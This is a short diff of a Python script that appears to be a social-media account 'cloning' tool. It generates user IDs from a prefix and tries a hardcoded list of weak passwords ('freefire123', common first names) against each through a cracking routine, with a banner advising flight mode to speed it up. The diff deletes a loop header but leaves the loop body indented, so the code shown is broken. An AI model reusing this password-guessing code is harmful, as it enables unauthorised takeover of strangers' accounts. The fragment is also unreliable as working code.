@@ -201,7 +201,7 @@ def xxr():
         jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
         jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
         jalan('\033[1;97m====================================================')
-        for love in user:
+        
             pwx = [uid,'i love free fire','freefire','freefire123','freefire321','freefire@123','freefire@321','free fire','free fire123','free fire@123','free fire321',' free fire@321','free fire123','i love you','jannat','tamanna','sadiya','shopna','nusrat']
             uid = code+love
             for Eman in HamiiID:
@@ -272,4 +272,4 @@ def rcrack(uid,pwx,tl):
         pass
  
 xxr()
- 
+ clear()
